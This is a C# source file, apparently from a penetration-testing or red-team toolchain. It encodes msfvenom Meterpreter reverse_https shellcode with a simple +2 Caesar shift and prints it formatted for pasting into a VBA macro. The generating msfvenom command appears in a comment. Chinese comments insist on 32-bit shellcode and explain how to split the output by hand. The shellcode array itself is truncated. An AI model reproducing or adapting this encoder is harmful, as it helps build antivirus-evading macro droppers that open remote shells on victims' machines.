using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace VBACaesar
{
    class Program
    {
        static void Main(string[] args)
        {
            // sudo msfvenom -p windows/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n'
            // 这里千万注意, 必须生成 32 位的 Shellcode !!
            byte[] buf = new byte[747] { 0xfc, 0xe8, 0x8f ... };

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload is: " + hex.ToString());
            // 需要手动将打印的转换后的 Shellcode 根据 "_" 符号分行 !
        }
    }
}